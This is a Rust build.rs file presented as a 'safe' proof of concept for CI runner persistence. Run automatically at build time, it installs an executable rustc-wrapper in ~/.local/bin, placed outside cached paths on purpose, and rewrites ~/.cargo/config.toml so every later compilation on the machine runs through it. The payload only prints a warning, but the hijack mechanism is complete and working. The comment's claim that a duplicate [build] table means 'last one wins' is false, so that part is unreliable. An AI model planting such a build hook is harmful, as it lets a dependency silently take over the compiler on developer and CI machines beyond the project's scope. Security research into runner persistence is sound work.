// build.rs
// Runner-persistence PoC (safe, reversible).
// - Installs ~/.local/bin/rustc-wrapper  (intentionally outside ~/.cargo to avoid rust-cache wipes)
// - Points Cargo to it via ~/.cargo/config.toml
// - Prints WARNING for every compiler invocation, then execs the real compiler
// No secrets, no network, non-destructive.

use std::{
    env, fs,
    fs::OpenOptions,
    io::{Read, Write},
    os::unix::fs::PermissionsExt,
    path::PathBuf,
};

fn make_exec(p: &PathBuf) {
    if let Ok(meta) = fs::metadata(p) {
        let mut perms = meta.permissions();
        perms.set_mode(0o755);
        let _ = fs::set_permissions(p, perms);
    }
}

fn main() {
    // Paths
    let home = env::var("HOME").unwrap_or_default();
    let cargo_dir = PathBuf::from(format!("{home}/.cargo"));
    let config_path = cargo_dir.join("config.toml");

    // IMPORTANT: put wrapper outside rust-cache's paths (it caches ~/.cargo/bin)
    let local_bin = PathBuf::from(format!("{home}/.local/bin"));
    let wrapper_path = local_bin.join("rustc-wrapper");
    let marker_path = cargo_dir.join("SAFE_POC_MARKER.txt");

    // Ensure dirs exist
    let _ = fs::create_dir_all(&local_bin);

    // 0) Harmless marker
    match OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&marker_path)
    {
        Ok(mut f) => {
            let _ = f.write_all(
                format!(
                    "SAFE_POC_MARKER: runner kept state if this persists.\n\
                     Path: {:?}\n",
                    marker_path
                )
                .as_bytes(),
            );
            println!(
                "cargo:warning=SAFE_PERSISTENCE: wrote marker at {:?}",
                marker_path
            );
        }
        Err(e) => println!("cargo:warning=SAFE_PERSISTENCE: marker write failed: {}", e),
    }

    // 1) Write rustc-wrapper (correct contract)
    let wrapper_script = r#"#!/usr/bin/env bash
# RUNNER_PERSIST_POC rustc-wrapper (non-cached path)
real="$1"; shift
echo "WARNING: ===RUNNER_PERSIST_POC HIT=== real: ${real##*/} args: $* (safe: no secrets, no network)" 1>&2
exec "$real" "$@"
"#;

    match OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&wrapper_path)
    {
        Ok(mut f) => {
            if let Err(e) = f.write_all(wrapper_script.as_bytes()) {
                println!(
                    "cargo:warning=PoC: failed writing wrapper {:?}: {}",
                    wrapper_path, e
                );
                return;
            }
            make_exec(&wrapper_path);
            println!(
                "cargo:warning=PoC: wrote rustc-wrapper at {:?}",
                wrapper_path
            );
        }
        Err(e) => {
            println!(
                "cargo:warning=PoC: cannot open wrapper path {:?}: {}",
                wrapper_path, e
            );
            return;
        }
    }

    // 2) Point Cargo to the wrapper via ~/.cargo/config.toml
    let setting_line = format!(r#"rustc-wrapper = "{}""#, wrapper_path.display());
    let mut existing = String::new();
    let have_cfg = match OpenOptions::new().read(true).open(&config_path) {
        Ok(mut f) => {
            let _ = f.read_to_string(&mut existing);
            true
        }
        Err(_) => false,
    };

    if have_cfg {
        if existing.contains("rustc-wrapper") {
            // Append a new [build] so TOML "last one wins" points to ~/.local/bin
            existing.push_str("\n[build]\n");
            existing.push_str(&setting_line);
            existing.push('\n');
        } else {
            existing.push_str("\n[build]\n");
            existing.push_str(&setting_line);
            existing.push('\n');
        }

        if let Ok(mut f) = OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(&config_path)
        {
            let _ = f.write_all(existing.as_bytes());
            println!(
                "cargo:warning=PoC: configured rustc-wrapper in {:?}",
                config_path
            );
        } else {
            println!("cargo:warning=PoC: failed to update {:?}", config_path);
        }
    } else {
        let new_cfg = format!("[build]\n{}\n", setting_line);
        if let Ok(mut f) = OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(&config_path)
        {
            let _ = f.write_all(new_cfg.as_bytes());
            println!("cargo:warning=PoC: created ~/.cargo/config.toml with rustc-wrapper");
        } else {
            println!("cargo:warning=PoC: cannot create {:?}", config_path);
        }
    }
}
